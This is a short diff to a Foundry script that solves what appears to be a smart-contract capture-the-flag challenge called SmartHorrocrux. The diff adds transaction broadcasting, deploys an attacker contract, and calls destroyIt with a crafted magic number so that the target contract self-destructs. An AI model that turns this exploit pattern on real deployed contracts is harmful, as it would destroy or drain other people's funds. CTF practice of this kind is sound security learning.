@@ -7,7 +7,7 @@ import "../src/attackers/SmartHorrocruxAttacker.sol";
 
 contract SmartHorrocruxTest is Script {
     SmartHorrocrux public target;
-    address instanceAddress = 0xF70AE12A09227b88Da94D70837db08629FeaD566;
+    address instanceAddress = 0x6b0cD71553295DDB63500B9F576cB09ccB790ce8;
 
     function setUp() public {
         target = SmartHorrocrux(payable(instanceAddress));
@@ -15,12 +15,21 @@ contract SmartHorrocruxTest is Script {
     }
 
     function run() public {
+        vm.startBroadcast();
+
         (bool success, ) = address(target).call("");
         new SmartHorrocruxAttacker{value: 1}(address(target));
         target.setInvincible();
 
-        target.destroyIt("EtherKadabra", 3064343999);
+        target.destroyIt(
+            "EtherKadabra",
+            uint256(
+                1674133736526169897937118197707213605401161395219457310256203720527328533346
+            )
+        );
 
         require(!target.alive(), "Failed");
+
+        vm.stopBroadcast();
     }
 }
